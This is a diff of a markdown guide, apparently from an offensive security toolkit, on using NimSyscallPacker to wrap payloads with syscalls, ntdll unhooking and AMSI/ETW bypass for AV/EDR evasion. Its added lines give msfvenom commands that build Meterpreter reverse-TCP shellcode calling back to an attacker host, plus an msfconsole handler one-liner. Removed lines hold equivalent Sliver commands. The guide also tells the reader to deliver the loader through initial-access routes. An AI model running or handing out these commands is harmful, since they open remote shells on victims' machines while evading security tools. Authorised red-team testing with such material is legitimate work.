@@ -1,7 +1,7 @@
 # NimSyscallPacker Integration
 
 Use [NimSyscallPacker](https://github.com/S3cur3Th1sSh1t/NimSyscallPacker) to pack
-your Sliver payload (shellcode, PE, or C# assembly) into a Nim binary that runs
+your payload (shellcode, PE, or C# assembly) into a Nim binary that runs
 it via **direct/indirect syscalls**, with **ntdll unhooking**, **AMSI/ETW bypass**,
 and optional **encryption** — a strong AV/EDR evasion layer on top of the plain
 C#/PowerShell/VBA loaders.
@@ -41,16 +41,14 @@ nim c -d:noRES NimSyscallLoader.nim
 
 ---
 
-## 2. Generate the Sliver payload
+## 2. Generate the payload
 
 ```bash
-# Raw shellcode (full implant as PIC)
-sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
+# Raw shellcode (full stageless Meterpreter as PIC)
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/sc.bin
 
-# Or a small msfvenom stager (needs a stage-listener running)
-sliver > profiles new --mtls <IP>:<PORT> --format shellcode my-profile
-sliver > stage-listener --url http://<IP>:8080 --profile my-profile --prepend-size
-msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=8080 LURI=/hello.woff -f raw -o /tmp/stager.bin
+# Or a small staged stager (needs the handler running)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f raw -o /tmp/stager.bin
 ```
 
 You can also pack a standalone `.exe` (`--format exe`) or a .NET assembly.
@@ -74,14 +72,14 @@ Common capabilities (see `--help`): direct/indirect syscalls, `--unhook`
 (ntdll unhooking), Hell's Gate / Halo's Gate syscall resolution, AMSI + ETW
 patch, sleep/evasion options, and remote-process injection variants.
 
-The output is a standalone EXE (or DLL/CPL) that runs the Sliver payload.
+The output is a standalone EXE (or DLL/CPL) that runs the payload.
 
 ---
 
 ## 4. Start the listener & execute
 
 ```bash
-sliver > mtls --lhost <IP> --lport <PORT>
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
 ```
 
 Deliver `loader.exe` via any of the initial-access paths (macro, HTA, UAC
